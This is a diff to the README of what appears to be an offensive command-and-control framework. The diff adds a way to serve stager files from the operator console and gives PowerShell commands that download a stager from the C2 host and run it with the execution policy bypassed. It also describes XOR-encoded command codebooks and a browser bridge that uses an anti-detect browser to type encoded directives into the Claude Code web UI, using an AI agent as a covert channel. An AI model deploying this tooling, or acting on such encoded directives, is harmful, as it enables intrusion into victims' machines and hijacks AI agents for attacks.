@@ -108,11 +108,26 @@ python operator/c4_server.py --port 9050 --tcp-port 9090
 
 The console listens for beacon check-ins on HTTP (`:9050`) and TCP (`:9090`). When a stager beacons in with a bridge URL, use `interact <name>` to open a browser session and start issuing commands.
 
+To also serve stager files over HTTP, pass `--serve-dir` pointing at the `out/` directory:
+
+```bash
+python operator/c4_server.py --port 9050 --tcp-port 9090 --serve-dir out/
+```
+
+Files are accessible at `GET /serve/<implant-id>/<filename>` (e.g. `/serve/abc123/rc_stager_full.ps1`). A listing of all implants and their files is available at `GET /serve`.
+
 ### 4. Deploy the stager
 
 Copy `out/<implant-id>/rc_stager_full.ps1` to the target. It contains everything needed — the implant, PshAgent, and MCP server — all loaded in-memory.
 
-On the target:
+If the operator console is running with `--serve-dir`, the target can pull the stager directly:
+
+```powershell
+Invoke-WebRequest -Uri http://<c2-host>:9050/serve/<implant-id>/rc_stager_full.ps1 -OutFile C:\temp\stager.ps1
+powershell -ExecutionPolicy Bypass -File C:\temp\stager.ps1
+```
+
+Or copy it manually and run:
 
 ```powershell
 powershell -ExecutionPolicy Bypass -File rc_stager_full.ps1
@@ -144,7 +159,7 @@ XOR-encrypts all mappings (codewords, tools, parameters, values) into a single b
 ### Operator
 
 #### operator/c4_server.py
-TUI-based operator console (Textual/Rich). Listens for beacon check-ins on HTTP and TCP ports, provides an interactive session manager for selecting targets and issuing commands. Parses operator input, encodes it via the implant's codebook, and delivers commands through the browser bridge or queues them for HTTP polling.
+TUI-based operator console (Textual/Rich). Listens for beacon check-ins on HTTP and TCP ports, provides an interactive session manager for selecting targets and issuing commands. Parses operator input, encodes it via the implant's codebook, and delivers commands through the browser bridge or queues them for HTTP polling. Optionally serves stager files over HTTP (`--serve-dir`) for target-side retrieval.
 
 #### operator/browser_bridge.py
 Automates the Claude Code web UI using Camoufox (anti-detect Firefox via Playwright). Manages browser sessions: opens a remote-control session URL, types encoded directives into the ProseMirror editor, detects processing state (interrupt button, spinner, shimmer animation), and extracts response text from the DOM when Claude finishes.
